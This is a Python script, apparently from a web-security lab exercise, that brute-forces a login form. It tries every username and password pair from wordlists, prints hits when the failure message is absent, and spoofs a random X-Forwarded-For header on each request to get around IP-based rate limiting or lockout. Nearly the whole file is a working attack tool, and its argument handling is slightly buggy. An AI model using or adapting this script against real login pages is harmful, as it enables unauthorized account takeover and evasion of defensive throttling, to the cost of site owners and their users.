import requests
# import grequests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re
from random import random
import logging

logging.basicConfig(filename='auth-lab-06.log', format='%(asctime)s - %(message)s', level=logging.INFO)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def check_response_code(res):
    print(res.status_code)


def find_username(url):
    print("testing")
    logging.warning("testing 2asdsadas")
    logging.info("testing info new")
    with open('../username_list.txt') as p:
        usernames = p.readlines()
    
    with open('../password_list.txt') as p:
        passwords = p.readlines()

    headers = {'X-Forwarded-For': str(random()*1000)}
    for username in usernames:
        for password in passwords:
            data = {"username": username.strip('\n'), "password": password.strip("\n")}
            headers = {'X-Forwarded-For': str(random()*1000)}
            r = requests.post(url, verify=False, proxies=proxies, data=data, headers=headers)
            print("Username: %s --- Password: %s -- %s" % (username.strip("\n"), password.strip('\n'), r.status_code))
            res = r.text
            if "Invalid username or password" not in res:
                print("Account credential found username: %s " % (username.strip("\n")))
            
            


def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Findings valid username")
	# password_length = sql_password_length(url)
	find_username(url)
	
	
if __name__ == "__main__":
	main()